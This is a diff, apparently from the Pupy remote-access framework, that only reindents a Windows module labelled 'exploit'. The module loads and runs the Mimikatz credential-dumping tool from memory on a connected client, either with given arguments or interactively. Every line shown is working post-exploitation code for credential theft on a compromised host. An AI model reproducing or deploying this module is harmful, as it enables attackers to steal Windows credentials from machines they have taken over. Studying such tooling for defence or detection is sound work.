@@ -14,32 +14,32 @@ __class_name__="Mimikatz"
 
 @config(cat="exploit", compat="windows")
 class Mimikatz(MemoryExec):
-	""" 
-		execute mimikatz from memory
-	"""
-	def init_argparse(self):
-		self.arg_parser = PupyArgumentParser(prog="mimikatz", description=self.__doc__)
-		self.arg_parser.add_argument('args', nargs='*', help='run mimikatz commands from argv (let empty to open mimikatz interactively)')
+    """ 
+        execute mimikatz from memory
+    """
+    def init_argparse(self):
+        self.arg_parser = PupyArgumentParser(prog="mimikatz", description=self.__doc__)
+        self.arg_parser.add_argument('args', nargs='*', help='run mimikatz commands from argv (let empty to open mimikatz interactively)')
 
 
-	def run(self, args):
-		proc_arch=self.client.desc["proc_arch"]
-		mimikatz_path=None
-		if "64" in proc_arch:
-			mimikatz_path=self.client.pupsrv.config.get("mimikatz","exe_x64")
-		else:
-			mimikatz_path=self.client.pupsrv.config.get("mimikatz","exe_Win32")
-		if not os.path.isfile(mimikatz_path):
-			self.error("Mimikatz exe %s not found ! please edit Mimikatz section in pupy.conf"%mimikatz_path)
-			return
+    def run(self, args):
+        proc_arch=self.client.desc["proc_arch"]
+        mimikatz_path=None
+        if "64" in proc_arch:
+            mimikatz_path=self.client.pupsrv.config.get("mimikatz","exe_x64")
+        else:
+            mimikatz_path=self.client.pupsrv.config.get("mimikatz","exe_Win32")
+        if not os.path.isfile(mimikatz_path):
+            self.error("Mimikatz exe %s not found ! please edit Mimikatz section in pupy.conf"%mimikatz_path)
+            return
 
-		mimikatz_args=args.args
-		interactive=False
-		timeout=None
-		if not mimikatz_args:
-			interactive=True
-			timeout=10
+        mimikatz_args=args.args
+        interactive=False
+        timeout=None
+        if not mimikatz_args:
+            interactive=True
+            timeout=10
 
-		exec_pe(self, mimikatz_args, path=mimikatz_path, interactive=interactive, fork=False, timeout=timeout)
-				
+        exec_pe(self, mimikatz_args, path=mimikatz_path, interactive=interactive, fork=False, timeout=timeout)
+                
 
